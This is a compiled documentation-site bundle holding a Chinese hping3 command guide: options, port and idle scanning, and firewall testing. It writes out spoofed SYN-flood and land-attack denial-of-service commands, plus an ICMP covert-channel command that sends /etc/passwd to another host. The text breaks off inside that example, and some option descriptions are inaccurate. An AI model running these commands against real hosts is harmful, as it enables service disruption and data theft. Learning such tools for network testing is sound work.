import{_ as s,c as n,o as a,a as l}from"./app.82736834.js";const D=JSON.parse('{"title":"hping3","description":"","frontmatter":{},"headers":[{"level":2,"title":"补充说明","slug":"补充说明","link":"#补充说明","children":[{"level":3,"title":"安装","slug":"安装","link":"#安装","children":[]},{"level":3,"title":"选项","slug":"选项","link":"#选项","children":[]},{"level":3,"title":"Hping3功能","slug":"hping3功能","link":"#hping3功能","children":[]},{"level":3,"title":"#  防火墙测试","slug":"防火墙测试","link":"#防火墙测试","children":[]},{"level":3,"title":"# 端口扫描","slug":"端口扫描","link":"#端口扫描","children":[]},{"level":3,"title":"# Idle扫描","slug":"idle扫描","link":"#idle扫描","children":[]},{"level":3,"title":"# 拒绝服务攻击","slug":"拒绝服务攻击","link":"#拒绝服务攻击","children":[]},{"level":3,"title":"# 文件传输","slug":"文件传输","link":"#文件传输","children":[]},{"level":3,"title":"# 木马功能","slug":"木马功能","link":"#木马功能","children":[]}]}],"relativePath":"linux/command/pages/hping3.md","lastUpdated":1666509709000}'),p={name:"linux/command/pages/hping3.md"},o=l(`<h1 id="hping3" tabindex="-1">hping3 <a class="header-anchor" href="#hping3" aria-hidden="true">#</a></h1><p>测试网络及主机的安全</p><h2 id="补充说明" tabindex="-1">补充说明 <a class="header-anchor" href="#补充说明" aria-hidden="true">#</a></h2><p><strong>hping</strong> 是用于生成和解析TCPIP协议数据包的开源工具。创作者是Salvatore Sanfilippo。目前最新版是hping3，支持使用tcl脚本自动化地调用其API。hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。</p><h3 id="安装" tabindex="-1">安装 <a class="header-anchor" href="#安装" aria-hidden="true">#</a></h3><div class="language-shell line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki material-theme-darker" tabindex="0"><code><span class="line"><span style="color:#FFCB6B;">yum</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">install</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">libpcap-devel</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">tc-devel</span></span>
<span class="line"><span style="color:#FFCB6B;">ln</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-s</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">/usr/include/pcap-bpf.h</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">/usr/include/net/bpf.h</span></span>
<span class="line"><span style="color:#FFCB6B;">wget</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">http://www.hping.org/hping3-20051105.tar.gz</span></span>
<span class="line"><span style="color:#FFCB6B;">tar</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">zxvf</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">hping3-20051105.tar.gz</span></span>
<span class="line"><span style="color:#82AAFF;">cd</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">hping3-</span><span style="color:#F78C6C;">20051105</span></span>
<span class="line"><span style="color:#82AAFF;">.</span><span style="color:#FFCB6B;">/configure</span></span>
<span class="line"><span style="color:#FFCB6B;">make</span></span>
<span class="line"><span style="color:#FFCB6B;">make</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">install</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h3 id="选项" tabindex="-1">选项 <a class="header-anchor" href="#选项" aria-hidden="true">#</a></h3><div class="language-shell line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki material-theme-darker" tabindex="0"><code><span class="line"><span style="color:#FFCB6B;">-H</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--help</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">显示帮助。</span></span>
<span class="line"><span style="color:#FFCB6B;">-v</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-VERSION</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">版本信息。</span></span>
<span class="line"><span style="color:#FFCB6B;">-c</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--count</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">count</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">发送数据包的次数</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">关于countreached_timeout</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">可以在hping2.h里编辑。</span></span>
<span class="line"><span style="color:#FFCB6B;">-i</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--interval</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">包发送间隔时间（单位是毫秒）缺省时间是1秒,此功能在增加传输率上很重要,在idle/spoofing扫描时此功能也会被用到,你可以参考hping-howto获得更多信息-fast</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">每秒发10个数据包。</span></span>
<span class="line"><span style="color:#FFCB6B;">-n</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-nmeric</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">数字输出，象征性输出主机地址。</span></span>
<span class="line"><span style="color:#FFCB6B;">-q</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-quiet</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">退出。</span></span>
<span class="line"><span style="color:#FFCB6B;">-I</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--interface</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">interface</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">name</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">无非就是eth0之类的参数。</span></span>
<span class="line"><span style="color:#FFCB6B;">-v</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--verbose</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">显示很多信息，TCP回应一般如：len=</span><span style="color:#F78C6C;">46</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">ip=192.168.1.1</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">flags=RADF</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">seq=</span><span style="color:#F78C6C;">0</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">ttl=</span><span style="color:#F78C6C;">255</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">id=</span><span style="color:#F78C6C;">0</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">win=</span><span style="color:#F78C6C;">0</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">rtt=0.4ms</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">tos=</span><span style="color:#F78C6C;">0</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">iplen=</span><span style="color:#F78C6C;">40</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">seq=</span><span style="color:#F78C6C;">0</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">ack=</span><span style="color:#F78C6C;">1380893504</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">sum=</span><span style="color:#F78C6C;">2010</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">urp=</span><span style="color:#F78C6C;">0</span></span>
<span class="line"><span style="color:#FFCB6B;">-D</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--debug</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">进入debug模式当你遇到麻烦时，比如用HPING遇到一些不合你习惯的时候，你可以用此模式修改HPING，（INTERFACE</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">DETECTION,DATA</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">LINK</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">LAYER</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">ACCESS,INTERFACE</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">SETTINGS,.......）</span></span>
<span class="line"><span style="color:#FFCB6B;">-z</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--bind</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">快捷键的使用。</span></span>
<span class="line"><span style="color:#FFCB6B;">-Z</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--unbind</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">消除快捷键。</span></span>
<span class="line"><span style="color:#FFCB6B;">-O</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--rawip</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">RAWIP模式，在此模式下HPING会发送带数据的IP头。</span></span>
<span class="line"><span style="color:#FFCB6B;">-1</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--icmp</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">ICMP模式，此模式下HPING会发送IGMP应答报，你可以用--ICMPTYPE</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--ICMPCODE选项发送其他类型/模式的ICMP报文。</span></span>
<span class="line"><span style="color:#FFCB6B;">-2</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--udp</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">UDP</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">模式，缺省下，HPING会发送UDP报文到主机的0端口，你可以用--baseport</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--destport</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--keep选项指定其模式。</span></span>
<span class="line"><span style="color:#FFCB6B;">-9</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--listen</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">signatuer</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">hping的listen模式，用此模式，HPING会接收指定的数据。</span></span>
<span class="line"><span style="color:#FFCB6B;">-a</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--spoof</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">hostname</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。</span></span>
<span class="line"><span style="color:#FFCB6B;">-t</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--ttl</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">time</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">to</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">live</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">可以指定发出包的TTL值。</span></span>
<span class="line"><span style="color:#FFCB6B;">-H</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--ipproto</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">在RAW</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">IP模式里选择IP协议。</span></span>
<span class="line"><span style="color:#FFCB6B;">-w</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--WINID</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">UNIX</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。</span></span>
<span class="line"><span style="color:#FFCB6B;">-r</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--rel</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。</span></span>
<span class="line"><span style="color:#FFCB6B;">-F</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--FRAG</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">更改包的FRAG，这可以测试对方对于包碎片的处理能力，缺省的“virtual</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">mtu”是16字节。</span></span>
<span class="line"><span style="color:#FFCB6B;">-x</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--morefrag</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">此功能可以发送碎片使主机忙于恢复碎片而造成主机的拒绝服务。</span></span>
<span class="line"><span style="color:#FFCB6B;">-y</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-dontfrag</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">发送不可恢复的IP碎片，这可以让你了解更多的MTU</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">PATH</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">DISCOVERY。</span></span>
<span class="line"><span style="color:#FFCB6B;">-G</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--fragoff</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">fragment</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">offset</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">value</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">set</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">the</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">fragment</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">offset</span></span>
<span class="line"><span style="color:#FFCB6B;">-m</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--mtu</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">mtu</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">value</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">用此项后ID数值变得很大，50000没指定此项时3000-20000左右。</span></span>
<span class="line"><span style="color:#FFCB6B;">-G</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--rroute</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">记录路由，可以看到详悉的数据等等，最多可以经过9个路由，即使主机屏蔽了ICMP报文。</span></span>
<span class="line"><span style="color:#FFCB6B;">-C</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--ICMPTYPE</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">type</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">指定ICMP类型，缺省是ICMP</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">echo</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">REQUEST。</span></span>
<span class="line"><span style="color:#FFCB6B;">-K</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--ICMPCODE</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">CODE</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">指定ICMP代号，缺省0。</span></span>
<span class="line"><span style="color:#FFCB6B;">--icmp-ipver</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">把IP版本也插入IP头。</span></span>
<span class="line"><span style="color:#FFCB6B;">--icmp-iphlen</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">设置IP头的长度，缺省为5（32字节）。</span></span>
<span class="line"><span style="color:#FFCB6B;">--icmp-iplen</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">设置IP包长度。</span></span>
<span class="line"><span style="color:#FFCB6B;">--icmp-ipid</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">设置ICMP报文IP头的ID，缺省是RANDOM。</span></span>
<span class="line"><span style="color:#FFCB6B;">--icmp-ipproto</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">设置协议的，缺省是TCP。</span></span>
<span class="line"><span style="color:#FFCB6B;">-icmp-cksum</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">设置校验和。</span></span>
<span class="line"><span style="color:#FFCB6B;">-icmp-ts</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">alias</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">for</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--icmptype</span><span style="color:#EEFFFF;"> </span><span style="color:#F78C6C;">13</span><span style="color:#EEFFFF;"> </span><span style="color:#89DDFF;">(</span><span style="color:#FFCB6B;">to</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">send</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">ICMP</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">timestamp</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">requests</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#FFCB6B;">--icmp-addr</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">Alias</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">for</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--icmptype</span><span style="color:#EEFFFF;"> </span><span style="color:#F78C6C;">17</span><span style="color:#EEFFFF;"> </span><span style="color:#89DDFF;">(</span><span style="color:#FFCB6B;">to</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">send</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">ICMP</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">address</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">mask</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">requests</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#FFCB6B;">-s</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--baseport</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">source</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">port</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">hping</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">用源端口猜测回应的包，它从一个基本端口计数，每收一个包，端口也加1，这规则你可以自己定义。</span></span>
<span class="line"><span style="color:#FFCB6B;">-p</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--deskport</span><span style="color:#EEFFFF;"> </span><span style="color:#89DDFF;">[</span><span style="color:#EEFFFF;">+</span><span style="color:#89DDFF;">][</span><span style="color:#EEFFFF;">+</span><span style="color:#89DDFF;">]</span><span style="color:#EEFFFF;">desk </span><span style="color:#C3E88D;">port</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">设置目标端口，缺省为0，一个加号设置为:每发送一个请求包到达后，端口加1，两个加号为：每发一个包，端口数加1。</span></span>
<span class="line"><span style="color:#FFCB6B;">--keep</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">上面说过了。</span></span>
<span class="line"><span style="color:#FFCB6B;">-w</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--win</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">发的大小和windows一样大，64BYTE。</span></span>
<span class="line"><span style="color:#FFCB6B;">-O</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--tcpoff</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">Set</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">fake</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">tcp</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">data</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">offset.</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">Normal</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">data</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">offset</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">is</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">tcphdrlen</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">/</span><span style="color:#EEFFFF;"> </span><span style="color:#F78C6C;">4.</span></span>
<span class="line"><span style="color:#FFCB6B;">-m</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--tcpseq</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">设置TCP序列数。</span></span>
<span class="line"><span style="color:#FFCB6B;">-l</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--tcpck</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">设置TCP</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">ack。</span></span>
<span class="line"><span style="color:#FFCB6B;">-Q</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--seqnum</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">搜集序列号的，这对于你分析TCP序列号有很大作用。</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br></div></div><h3 id="hping3功能" tabindex="-1">Hping3功能 <a class="header-anchor" href="#hping3功能" aria-hidden="true">#</a></h3><p>Hping3主要有以下典型功能应用：</p><h3 id="防火墙测试" tabindex="-1">#  防火墙测试 <a class="header-anchor" href="#防火墙测试" aria-hidden="true">#</a></h3><p>使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。请参考：<a href="http://0daysecurity.com/articles/hping3_examples.html" target="_blank" rel="noreferrer">http://0daysecurity.com/articles/hping3_examples.html</a></p><p>测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。</p><div class="language-shell line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki material-theme-darker" tabindex="0"><code><span class="line"><span style="color:#FFCB6B;">hping3</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-S</span><span style="color:#EEFFFF;">  </span><span style="color:#C3E88D;">-c</span><span style="color:#EEFFFF;"> </span><span style="color:#F78C6C;">1000000</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-a</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">10.10.10.10</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-p</span><span style="color:#EEFFFF;"> </span><span style="color:#F78C6C;">21</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">10.10.10.10</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><h3 id="端口扫描" tabindex="-1"># 端口扫描 <a class="header-anchor" href="#端口扫描" aria-hidden="true">#</a></h3><p>Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。以下示例可用于探测目标机的80端口是否开放：</p><div class="language-shell line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki material-theme-darker" tabindex="0"><code><span class="line"><span style="color:#FFCB6B;">hping3</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-I</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">eth0</span><span style="color:#EEFFFF;">  </span><span style="color:#C3E88D;">-S</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">192.168.10.1</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-p</span><span style="color:#EEFFFF;"> </span><span style="color:#F78C6C;">80</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>其中<code>-I eth0</code>指定使用eth0端口，<code>-S</code>指定TCP包的标志位SYN，<code>-p 80</code>指定探测的目的端口。</p><p>hping3支持非常丰富的端口探测方式，nmap拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。</p><h3 id="idle扫描" tabindex="-1"># Idle扫描 <a class="header-anchor" href="#idle扫描" aria-hidden="true">#</a></h3><p>Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，目前Idle扫描在Nmap中也有实现。</p><p>该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。</p><h3 id="拒绝服务攻击" tabindex="-1"># 拒绝服务攻击 <a class="header-anchor" href="#拒绝服务攻击" aria-hidden="true">#</a></h3><p>使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。</p><div class="language-shell line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki material-theme-darker" tabindex="0"><code><span class="line"><span style="color:#FFCB6B;">hping3</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-I</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">eth0</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-a192.168.10.99</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-S</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">192.168.10.33</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-p</span><span style="color:#EEFFFF;"> </span><span style="color:#F78C6C;">80</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">-i</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">u1000</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>其他攻击如smurf、teardrop、land attack等也很容易构建出来。</p><h3 id="文件传输" tabindex="-1"># 文件传输 <a class="header-anchor" href="#文件传输" aria-hidden="true">#</a></h3><p>Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：</p><div class="language-shell line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki material-theme-darker" tabindex="0"><code><span class="line"><span style="color:#FFCB6B;">hping3</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">192.168.1.159--listen</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">signature</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--safe</span><span style="color:#EEFFFF;">  </span><span style="color:#C3E88D;">--icmp</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>监听ICMP包中的签名，根据签名解析出文件内容。</p><p>在发送端使用签名打包的ICMP包发送文件：</p><div class="language-shell line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki material-theme-darker" tabindex="0"><code><span class="line"><span style="color:#FFCB6B;">hping3</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">192.168.1.108--icmp</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">?d</span><span style="color:#EEFFFF;"> </span><span style="color:#F78C6C;">100</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--sign</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">signature</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">--file</span><span style="color:#EEFFFF;"> </span><span style="color:#C3E88D;">/etc/passwd</span></span>
